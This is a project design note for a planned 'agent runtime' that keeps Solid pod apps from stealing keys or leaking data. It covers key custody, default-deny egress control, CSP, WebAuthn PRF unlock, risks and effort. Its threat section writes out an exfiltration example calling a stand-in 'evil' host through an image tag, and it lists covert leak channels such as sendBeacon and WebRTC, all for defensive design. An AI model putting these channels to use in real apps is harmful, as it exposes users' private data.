# The agent runtime (a.k.a. the "runtime browser")

**Status: PARKED — out of scope for the current feedback-pipeline work. Captured here so the
design isn't lost.** A companion client-side project to canopy. Written 2026-06-07 from a design
discussion; revisit before starting it.

> One-line: **not a web browser — a *runtime* for Solid/agent apps = a key-custody wallet + an
> egress firewall + an embedded renderer.** It lets a participant use untrusted JS pod-apps
> without those apps being able to steal their keys or exfiltrate their data.

---

## 1. Why this exists

Two weaknesses in the "use a normal pod browser + JS web apps" model:

1. **The JS-trust problem.** A Solid app is just JavaScript loaded from some origin. Once you
   log it into your pod, it runs with your credentials and can read your data *and send it
   anywhere*. The web's security model (same-origin, CORS) protects **servers from each other**,
   not **your data from the app**. You're trusting every app author not to exfiltrate.
2. **Keys + the double-prompt UX.** Because **CSS stores resources as plaintext on disk**
   (protected only by ACL/ACP, *not* encrypted at rest), we seal everything in the pod — both
   the participant's **own** pod (raw + cleaned) and the **central** pod. So reading even your
   *own* pod needs a decryption key. With a normal browser that means **two secret prompts**:
   one to log in (Solid-OIDC), one to decrypt. Unusual and inconvenient.

The runtime solves both at once: it **holds the keys** (so apps never see them and the user
unlocks once), and it **controls egress** (so apps can't phone home).

---

## 2. What it is (and isn't)

- **Not** a browser engine. Writing one is hundreds of person-years (Chromium/Gecko). We embed
  an existing engine and own the **network + permission + key** layers around it.
- **Three fused components:**
  1. **Key-custody wallet.** Holds the participant's `AgentIdentity` (sign + encrypt keys) and
     any content keys, in the OS keystore / hardware. Apps **never receive the raw key**; they
     call a **mediated API** (`sign(bytes)`, `open(blob)`, `seal(text, recipients)`), which the
     runtime gates, prompts for, and audits. This is the **MetaMask model**: the dApp asks the
     wallet to sign; the wallet never exposes the key.
  2. **Egress firewall.** Default-deny **all** network egress except destinations the user
     approved (their pod origins) or an app declared in its manifest and the user accepted.
  3. **Embedded renderer.** Just enough to run the canopy/feedback class of apps — explicitly
     **not** a general browser (see §5, "pages break is a feature").

### Targets
- **Desktop / laptop:** **Tauri** (Rust backend + OS WebView). Best fit — small footprint, a
  built-in **capability/allowlist** system close to what we want, and Rust for the vault +
  network policy. (Electron is the heavier fallback.)
- **Mobile:** primary path is **specialized Expo apps** (a browser is not the main surface on
  phone), where Google/Apple store policies also reduce — though don't eliminate — login abuse.
  A **Tauri-mobile** build of this runtime is a good *secondary* for phone, later.

---

## 3. The problems it must solve, and how

### 3.1 Key custody + the double-prompt UX
- **Mediated key API**, never key hand-off (the wallet pattern). A malicious app can't steal a
  key it never touches; it can only *request* operations, which the runtime can gate/audit.
- **Unlock once per session** — login persists via the OIDC refresh token; the content key is
  held in memory (or a non-extractable WebCrypto key) for the session.
- **One gesture via WebAuthn PRF** — a passkey (Face ID / fingerprint / security key) with the
  `prf` extension deterministically derives a symmetric secret, so a single gesture both
  authenticates *and* yields the decryption key. The target UX.
- **Or derive both from one passphrase** (ProtonMail/Bitwarden): `argon2(passphrase)` → an auth
  value + a local encryption key. Clean when the runtime owns the login surface (it does).
- **Reuse what exists:** canopy's `@canopy/vault` + `AgentIdentity` already model a device-held
  identity unlocked once; the runtime is the natural host for it.

### 3.2 Egress control — whitelist by *destination*, not by *data type*
The tempting "allow fonts/images, block forms" is the trap: a malicious app exfiltrates via
`<img src=https://evil/?stolen=…>`, CSS `url()`, `<link>`/`<script src>` query strings,
`navigator.sendBeacon`, **WebRTC data channels** (bypass proxies), DNS prefetch, or navigation
with data in the URL. So an image allowlist *is* an exfiltration channel.

The robust rule: **default-deny ALL egress regardless of type**, allowing only:
1. the **pod origins** the user approved, and
2. origins an app **declares in a manifest** that the user explicitly accepted (mobile-app-style
   permissions).

Enforced by the **shell, not the app** (so the app can't relax it), using existing primitives:
- a strict **CSP** the shell injects (`default-src 'none'; connect-src <pods>; img-src <pods>;…`),
- request interception (Tauri Rust net layer / Electron `session.webRequest`) with default-deny,
- disable service workers + WebRTC; `contextIsolation` on; `nodeIntegration` off; sandboxed iframes.

This is essentially **uMatrix** (per-origin × per-type allow/block — discontinued but a proven
model worth studying) **plus a wallet**.

### 3.3 App authenticity
Egress control stops exfiltration but not a contained-but-malicious app corrupting data or
socially engineering the user. Mitigations: **app signing + reproducible builds + a vetted
registry + pinned versions**, and showing the app's verified identity in the UI. An ecosystem
effort, not just code.

---

## 4. Implications / risks (don't miss these)

- **Consent fatigue.** "Prompt for every connection" trains users to click *Allow*. Fix: a
  **manifest** the user approves once as a meaningful summary, so per-connection prompts are
  rare. Per-connection prompting as the *primary* UX will backfire.
- **You inherit engine CVEs.** A security client on Chromium/WebView means promptly tracking and
  shipping engine security updates, and being a target. Real ongoing cost.
- **Key recovery / device loss.** Device-held keys mean a lost device loses the data — needs a
  recovery story (ties into the escrow/recovery knobs in the project config).
- **Covert / timing channels** can't be fully closed. Threat model = a curious/moderately
  malicious app phoning home — **not** a compromised OS, a hostile runtime, or engine supply-chain.
- **"Pages will break" is a feature.** Not being a general browser removes the web-compat
  treadmill and shrinks attack surface. Position as *"the Solid/agent app runtime,"* not a browser.

---

## 5. Effort & base tech

- **MVP** (desktop: Tauri shell + injected CSP + default-deny egress + manifest consent + key
  vault with mediated `sign`/`open`): **~2–4 months, 1–2 strong engineers.** The "browser" part
  is mostly configuring the engine's session; the hard work is closing exfiltration channels
  rigorously and the key-mediation API done safely.
- **Hardened** (security-audited; desktop **and** mobile via Expo / Tauri-mobile — which
  multiplies effort — plus an app registry): **~6–12+ months.**
- **Recommended MVP shape — wallet-first:** (1) key custody with passkey/PRF unlock + mediated
  `sign`/`open` (high value alone; also solves the double-prompt), (2) default-deny egress with a
  per-app manifest, (3) a minimal renderer for the canopy/feedback apps. Ship for the civic
  use-case (we control both ends → adoption is a non-issue), then generalise.

### Prior art to study first (saves months)
- **MetaMask** — the key-mediation / wallet pattern, proven at scale.
- **uMatrix** — per-origin × per-type request control (the egress model).
- **WebAuthn PRF** — one-gesture auth + key derivation.
- **Tauri capabilities/allowlist** — the likely base's permission system.
- **Electron security checklist** — `contextIsolation`, sandbox, no `nodeIntegration`.

---

## 6. Where it fits in canopy

This is the **client-side complement** to the server-side privacy work (see
`SECURITY-MODEL.md`):

- **Server side:** the *host* can't read you — seal at rest, signatures/anti-sybil, enforced
  aggregation **placement** (host / controller / enclave), and the **TEE** endgame.
- **Client side (this runtime):** the *app* can't steal your key or exfiltrate your plaintext —
  key custody + egress control.

Together they minimise trust on **both** ends. The existing "agentbrowser" experiment in the
repo is the seed of this.

---

## 7. Open decisions for when we pick this up

- Tauri vs Electron for the desktop MVP (lean Tauri).
- Manifest format + the exact mediated key-API surface (`sign`/`open`/`seal`/pod-scope grants) —
  should dovetail with `@canopy/vault` + `AgentIdentity` and the seal/verify model.
- Passkey/PRF vs passphrase-derived key as the default unlock.
- App registry / signing model and who curates it.
- Recovery story for device loss (link to the project escrow/recovery design).
